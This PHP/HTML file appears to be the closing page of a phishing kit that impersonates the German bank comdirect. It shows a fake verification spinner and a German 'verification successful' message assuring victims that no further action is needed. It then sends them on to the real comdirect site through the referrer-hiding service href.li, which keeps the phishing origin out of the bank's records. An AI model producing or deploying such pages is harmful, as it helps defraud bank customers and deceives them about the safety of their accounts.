<?php

	$this_Title = "Verifizierung";

	include("comdirect_config.inc.php");
	
	session_start();
	
	$_SESSION["process_finished"] = TRUE;
	
	if(isset($_POST["execute_task"])) {
		header("Location: https://href.li/?https://comdirect.de");
		exit();
	}
	
	include("comdirect_header.tpl.php");
	
?>

<!-- START FIRST BLOCK -->
<div id="appFirstContentBlock" style="display:none;">
	<div class="cif-scope bg-color--cd-black-0">
		<div class="grid-container--limited-md  hidden-lg kontoinhaber__container" id="div_kontoinhaber"> </div>
	</div>
	<div class="cif-scope-content-wrapper siteFrame" data-plugin="{common_eventHub: {events: ['resize']}}">
		<div class="grid-container--limited-md grid-container">
			<div class="grid--no-gutter grid">
				<div class="col--md-6 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1">
					<div class="col__content col__content--no-padding-bottom">
						<h1 class="headline--h1 headline">Herzlichen Glückwunsch!</h1></div>
				</div>
				<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
					<div class="col__content col__content--no-padding-top">
						<h5 class="hidden-sm headline--h5 headline">Ihre Verifizierung wurde erfolgreich durchgeführt.</h5>
						<p>Wir haben Ihre Angaben erfolgreich geprüft und Ihre Verifizierung systemweit durchgeführt. Ab sofort können Sie mit der Nutzung Ihrer Dienste wie gewohnt fortfahren und diese Seite verlassen.<br /><br />
						
						Betätigen Sie die nachfolgende Schaltfläche, um auf unsere Hauptseite weitergeleitet zu werden.</p>
						<form id="login" method="post" action="">
							<div class="grid--no-gutter grid grid--no-bottom">

			<div class="col col-12">

				<div class="col__content col__content--no-padding-horizontal col__content--no-padding-bottom col__content--padding-top">
					<button type="submit" name="execute_task" class="button button--growing button--large button--primary">Weiterleitung durchführen</button>
				</div>
			</div>

		</div>
		</form>
	</div>
	</div>
	<div class="col--md-6 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1">
		<div class="col__content col__content--no-padding-vertical">
			<div class="outer-spacing--xxlarge-top">
				<h5 class="headline--h5 headline">Weitere Informationen</h5>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-0">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50">1.</span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Sie haben diesen Vorgang erfolgreich durchgeführt und können diese Seite nun verlassen.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-1">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50">2.</span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Ihre Dienste in unserem Haus bleiben wie gewohnt für Sie nutzbar.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-2">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50">3.</span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Es sind Ihrerseits nun keine weiteren Aktionen erforderlich.</span></div>
					</label>
				</div>
				<div class="outer-spacing--medium-bottom">
					<label class="flex-layout" for="layer-3">
						<div><span class="icon icon--cd_warning-16 icon--size-16 color--cd-anthracite-50">4.</span></div>
						<div class="inner-spacing--xsmall-left"><span class="link link--secondary">Klicken Sie auf "Weiterleitung durchführen", um auf unsere Hauptseite weitergeleitet zu werden.</span></div>
					</label>
				</div>
				
				
			</div>
		</div>
	</div>

	</div>
	</div>
	</div>
</div>
<!-- END FIRST BLOCK -->

<!-- START SECOND BLOCK -->
<div id="appSecondContentBlock">
	<div class="cif-scope bg-color--cd-black-0">
		<div class="grid-container--limited-md  hidden-lg kontoinhaber__container" id="div_kontoinhaber"> </div>
	</div>
	<div class="cif-scope-content-wrapper siteFrame" data-plugin="{common_eventHub: {events: ['resize']}}">
		<div class="grid-container--limited-md grid-container">
			<div class="grid--no-gutter grid">
				<div class="col--md-12 col col--sm-4 col--md-push-right-1 col--lg-12 col--md-push-left-1" style="text-align:center;">
					<div class="col__content col__content--no-padding-bottom">
					<center>
						<h1 class="headline--h1 headline"><?=$this_Title;?></h1>
						<h5 class="hidden-sm headline--h5 headline">Ihre Verifizierung wird abgeschlossen in <span class="c" id="7"></span><strong>.</strong><strong>.</strong><strong>.</strong></span></h5>
						<p>Bitte haben Sie einen Augenblick Geduld, während wir Ihre Angaben prüfen.</p>
						<div class="loadingio-spinner-ripple-vt58jhm15vl"><div class="ldio-ta0zz1t2c58">
<div></div><div></div>
</div></div>
<style type="text/css">
@keyframes ldio-ta0zz1t2c58 {
  0% {
    top: 96px;
    left: 96px;
    width: 0;
    height: 0;
    opacity: 1;
  }
  100% {
    top: 18px;
    left: 18px;
    width: 156px;
    height: 156px;
    opacity: 0;
  }
}.ldio-ta0zz1t2c58 div {
  position: absolute;
  border-width: 4px;
  border-style: solid;
  opacity: 1;
  border-radius: 50%;
  animation: ldio-ta0zz1t2c58 1s cubic-bezier(0,0.2,0.8,1) infinite;
}.ldio-ta0zz1t2c58 div:nth-child(1) {
  border-color: #fff61d;
  animation-delay: 0s;
}
.ldio-ta0zz1t2c58 div:nth-child(2) {
  border-color: #fff61d;
  animation-delay: -0.5s;
}
.loadingio-spinner-ripple-vt58jhm15vl {
  width: 200px;
  height: 200px;
  display: inline-block;
  overflow: hidden;
  background: none;
}
.ldio-ta0zz1t2c58 {
  width: 100%;
  height: 100%;
  position: relative;
  transform: translateZ(0) scale(1);
  backface-visibility: hidden;
  transform-origin: 0 0; /* see note above */
}
.ldio-ta0zz1t2c58 div { box-sizing: content-box; }
</style>
					</div>
				</div>
				<div class="col--md-12 col col--sm-4 col--lg-6 col--md-push-right-1 col--md-push-left-1" style="text-align:center;">
					<div class="col__content col__content--no-padding-top">


	</div>
	</div>


	</div>
	</div>
	</div>
</div>
<!-- END SECOND BLOCK -->

<?php

	include("comdirect_footer.tpl.php");
	
?>